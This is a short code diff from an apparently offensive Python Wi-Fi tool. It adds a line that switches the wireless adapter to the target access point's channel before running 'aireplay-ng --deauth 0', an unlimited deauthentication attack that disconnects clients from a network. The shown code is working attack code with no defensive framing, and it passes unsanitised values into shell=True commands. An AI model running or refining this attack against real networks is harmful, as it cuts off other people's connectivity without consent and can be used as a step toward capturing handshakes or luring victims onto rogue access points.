@@ -309,6 +309,7 @@ def handleWiFi():
                 else:
                     command = f"sudo aireplay-ng --deauth 0 -a {ap_mac} {adapter}" 
                     try:
+                        subprocess.run(f"iwconfig {adapter} channel {channel}", shell=True, check=True)
                         subprocess.run(command, shell=True, check=True)
                     except subprocess.CalledProcessError as e:
                         print(f"[!] Error executing command: {e}")
